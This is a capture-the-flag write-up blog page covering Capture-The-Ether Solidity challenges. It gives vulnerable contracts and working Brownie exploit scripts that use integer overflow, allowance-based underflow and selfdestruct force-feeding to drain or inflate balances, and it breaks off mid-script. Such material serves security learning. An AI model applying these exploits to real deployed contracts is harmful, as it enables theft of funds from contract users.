<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="MathToken sale123456789101112131415161718192021222324252627pragma solidity ^0.4.21;contract TokenSaleChallenge &amp;#123;    mapping(address &#x3D;&gt; uint256) public balanceOf;    uint256 constant PRICE_PER">
<meta property="og:type" content="article">
<meta property="og:title" content="Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous">
<meta property="og:url" content="http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/index.html">
<meta property="og:site_name" content="chandu kona">
<meta property="og:description" content="MathToken sale123456789101112131415161718192021222324252627pragma solidity ^0.4.21;contract TokenSaleChallenge &amp;#123;    mapping(address &#x3D;&gt; uint256) public balanceOf;    uint256 constant PRICE_PER">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-12-03T14:50:11.000Z">
<meta property="article:modified_time" content="2022-12-09T01:28:06.417Z">
<meta property="article:author" content="Chandu Kona">
<meta property="article:tag" content="SmartContract">
<meta property="article:tag" content="ethereum">
<meta property="article:tag" content="solidity">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="CaptureTheEther">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&text=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&is_video=false&description=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous&body=Check out this article: http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&name=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&t=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Math"><span class="toc-number">1.</span> <span class="toc-text">Math</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-sale"><span class="toc-number"></span> <span class="toc-text">Token sale</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-whale"><span class="toc-number"></span> <span class="toc-text">Token whale</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Retirement-fund"><span class="toc-number"></span> <span class="toc-text">Retirement fund</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mapping"><span class="toc-number"></span> <span class="toc-text">Mapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Donation"><span class="toc-number"></span> <span class="toc-text">Donation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fifty-years"><span class="toc-number"></span> <span class="toc-text">Fifty years</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Accounts"><span class="toc-number">1.</span> <span class="toc-text">Accounts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzzy-identity"><span class="toc-number"></span> <span class="toc-text">Fuzzy identity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Public-key"><span class="toc-number"></span> <span class="toc-text">Public key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Account-takeover"><span class="toc-number"></span> <span class="toc-text">Account takeover</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Miscellaneous"><span class="toc-number">1.</span> <span class="toc-text">Miscellaneous</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Asume-ownership"><span class="toc-number"></span> <span class="toc-text">Asume ownership</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-bank"><span class="toc-number"></span> <span class="toc-text">Token bank</span></a>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Chandu Kona</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-12-03T14:50:11.000Z" itemprop="datePublished">2022-12-03</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CaptureTheEther/" rel="tag">CaptureTheEther</a>, <a class="tag-link-link" href="/tags/SmartContract/" rel="tag">SmartContract</a>, <a class="tag-link-link" href="/tags/ethereum/" rel="tag">ethereum</a>, <a class="tag-link-link" href="/tags/solidity/" rel="tag">solidity</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <hr>
<h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><h2 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TokenSaleChallenge</span> &#123;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line">    uint256 constant <span class="variable constant_">PRICE_PER_TOKEN</span> = <span class="number">1</span> ether;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">TokenSaleChallenge</span>(<span class="params">address _player</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &lt; <span class="number">1</span> ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params">uint256 numTokens</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == numTokens * <span class="variable constant_">PRICE_PER_TOKEN</span>);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sell</span>(<span class="params">uint256 numTokens</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= numTokens;</span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(numTokens * <span class="variable constant_">PRICE_PER_TOKEN</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to make the balance of this contract to be less than 1 ether. this contract provides us with <code>buy()</code> and <code>sell()</code> functions where in <code>buy()</code> function contract checks if the amount of tokens we are buying * 10^18 is equal to <code>msg.value</code>, since this contract is not using <code>safemath</code> library we can overflow the integers. we can pass a value to <code>numbTokens</code> such that when it is multiplied with <code>PRICE_PER_TOKEN</code> the product will be grater than <code>2^256</code>, this makes the integer overflow and getting a mod of <code>2^256</code> done and the value will be the remainder which is less than an ether which we give as the <code>msg.value</code> to get the check pass and get tokens, now we got a lot of tokens with very less price, now we can sell them and drain the contract’s balance to complete this challenge.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> TokenSaleChallenge, accounts, Wei</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = TokenSaleChallenge.deploy(</span><br><span class="line">        player, &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    tokens = inverse(Wei(<span class="string">&#x27;1 ether&#x27;</span>), <span class="number">2</span>**<span class="number">256</span>)</span><br><span class="line">    contract.buy(tokens, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: (</span><br><span class="line">        tokens*Wei(<span class="string">&#x27;1 ether&#x27;</span>)) % <span class="number">2</span>**<span class="number">256</span>&#125;)</span><br><span class="line">    contract.sell(<span class="number">1</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TokenWhaleChallenge</span> &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = <span class="string">&quot;Simple ERC20 Token&quot;</span>;</span><br><span class="line">    string public symbol = <span class="string">&quot;SET&quot;</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">TokenWhaleChallenge</span>(<span class="params">address _player</span>) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = <span class="number">1000</span>;</span><br><span class="line">        balanceOf[player] = <span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> balanceOf[player] &gt;= <span class="number">1000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Transfer</span>(address indexed <span class="keyword">from</span>, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_transfer</span>(<span class="params">address to, uint256 value</span>) internal &#123;</span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Transfer</span>(msg.<span class="property">sender</span>, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= value);</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">_transfer</span>(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Approval</span>(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 value</span>) public &#123;</span><br><span class="line">        allowance[msg.<span class="property">sender</span>][spender] = value;</span><br><span class="line">        emit <span class="title class_">Approval</span>(msg.<span class="property">sender</span>, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">        address to,</span></span><br><span class="line"><span class="params">        uint256 value</span></span><br><span class="line"><span class="params">    </span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[<span class="keyword">from</span>] &gt;= value);</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        <span class="built_in">require</span>(allowance[<span class="keyword">from</span>][msg.<span class="property">sender</span>] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[<span class="keyword">from</span>][msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        <span class="title function_">_transfer</span>(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To compete this challenge we need make the balance of player to be grater than <code>1000000</code>. similar to the previous challenge this contract is not using <code>safemath</code> library, but in this case instead of overflowing integer we are able to make an underflow of the balance of the player. if we observe the <code>transferFrom()</code> function it has checks whether the from address has sufficient balance and the allowance of the from to <code>msg.sender</code> but the transfer is done from <code>msg.sender</code> to the given to_address since it is calling the <code>_transfer()</code> function and that function is transfering funds from <code>msg.sender</code> so in this case the contract doesn’t checks for the balance of the <code>msg.sender</code> before deducting it so if we send more funds than the balance from our players account using <code>transferFrom()</code> function, then we can make the integer which holds the player’s balance to get underflowed and make the balance grater than <code>1000000</code> to complete this challenge.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> TokenWhaleChallenge, accounts, ZERO_ADDRESS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line">    helper = accounts[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    contract = TokenWhaleChallenge.deploy(player,</span><br><span class="line">                                          &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    contract.transfer(helper, <span class="number">505</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    contract.approve(player, <span class="number">500</span>, &#123;<span class="string">&#x27;from&#x27;</span>: helper&#125;)</span><br><span class="line">    contract.transferFrom(helper, ZERO_ADDRESS, <span class="number">500</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">RetirementFundChallenge</span> &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.<span class="property">sender</span>;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + <span class="number">10</span> years;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">RetirementFundChallenge</span>(<span class="params">address player</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (now &lt; expiration) &#123;</span><br><span class="line">            <span class="comment">// early withdrawal incurs a 10% penalty</span></span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>((<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> * <span class="number">9</span>) / <span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">collectPenalty</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn = startBalance - <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// an early withdrawal occurred</span></span><br><span class="line">        <span class="built_in">require</span>(withdrawn &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// penalty is what&#x27;s left</span></span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to steal the funds of this conract. this contract allows us to collect the penalty using <code>collectPenalty()</code> function if the owner withdraws his funds before the expiration time. but if we observer the <code>collectPenalty()</code> function the contract is checking if the difference between startBalance which is the amount deposited in the start and the current balance is <code>0</code> if not the remaining balance is transfered to our address. so if send some extra ether to this contract we steal all the balance left inside this contract but this contract doesn’t have a <code>fallback()</code> or <code>recieve()</code> function to accept ether. but we can force this contract to recieve ether by destroying an other contract using <code>selfdestruct</code> method and to send it’s remaining balance to this contract.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Rf</span>_Exploit &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable _address</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="title function_">selfdestruct</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> RetirementFundChallenge, Rf_Exploit, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = RetirementFundChallenge.deploy(</span><br><span class="line">        player, &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">    Rf_Exploit.deploy(</span><br><span class="line">        contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span 